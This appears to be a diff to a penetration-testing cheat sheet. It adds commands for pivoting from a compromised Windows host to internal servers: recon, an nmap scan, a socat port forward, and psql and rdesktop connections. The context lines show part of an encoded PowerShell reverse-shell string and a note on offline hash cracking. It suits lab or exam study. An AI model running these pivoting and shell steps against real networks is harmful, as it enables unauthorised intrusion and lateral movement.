@@ -1390,6 +1390,18 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
   11. cracked offline by using hashcat or john
 
 # Port tunneling and port redirection
+- Port forward with socat (MS01 to MS02 or DC01)
+  - Listen on local port 2345 on MS01. fork allows multiple connections
+  - Forward everything to target IP 10.4.50.215 (MS02/DC01) port 5432 (PostgreSQL in this example)
+  ```
+  ipconfig /all           # Check MS01 IP/subnet
+  netstat -an             # See open ports
+  ping MS02               # Test connectivity
+  nmap -Pn -p- 10.4.50.215 # Scan internal host from MS01
+  ```
+  `socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432`  
+  `psql -h 127.0.0.1 -p 2345 -U postgres`  # Example for PostgreSQL
+  `rdesktop 127.0.0.1:3389`  
 - Tutotial
   - [How to Use Ligolo-ng (Easy to Follow Pivoting Tutorial)](https://www.stationx.net/how-to-use-ligolo-ng/)  
   - [Lateral Movement guide to multi hop pivioting with ligolo-ng](https://cyberwarfare.live/lateral-movement-a-guide-to-multi-hop-pivoting-with-ligolo-ng/)
